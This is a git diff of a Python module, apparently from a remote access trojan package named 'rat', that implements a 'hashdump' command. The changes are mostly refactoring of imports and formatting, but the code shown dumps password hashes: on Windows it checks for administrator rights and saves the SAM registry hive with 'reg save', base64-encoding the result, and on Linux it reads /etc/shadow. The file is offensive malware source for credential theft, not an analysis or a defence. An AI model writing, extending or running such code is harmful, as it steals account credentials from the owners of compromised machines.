@@ -1,8 +1,11 @@
 import platform
 import os
+import ctypes
 import subprocess
+import base64
 from pathlib import Path
-from rat.commands.base_command import BaseCommand
+from .base_command import BaseCommand
+
 
 class HashdumpCommand(BaseCommand):
     name = "hashdump"
@@ -26,7 +29,6 @@ class HashdumpCommand(BaseCommand):
     # Windows – uses reg save, no hang, base64 encoded hives
     # -----------------------------------------------------------------
     def _windows_dump(self):
-        import ctypes, subprocess, base64
         from pathlib import Path
 
         if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -37,7 +39,9 @@ class HashdumpCommand(BaseCommand):
 
         result = subprocess.run(
             ["reg", "save", "HKLM\\SAM", sam_file, "/y"],
-            capture_output=True, text=True, timeout=10
+            capture_output=True,
+            text=True,
+            timeout=10,
         )
         if result.returncode != 0:
             return f"reg save failed: {result.stderr.strip()}"
@@ -64,6 +68,7 @@ class HashdumpCommand(BaseCommand):
             return "Error: cannot read /etc/shadow – permission denied"
         except Exception as e:
             return f"Linux dump error: {e}"
+
     # -----------------------------------------------------------------
     # macOS – placeholder
     # -----------------------------------------------------------------
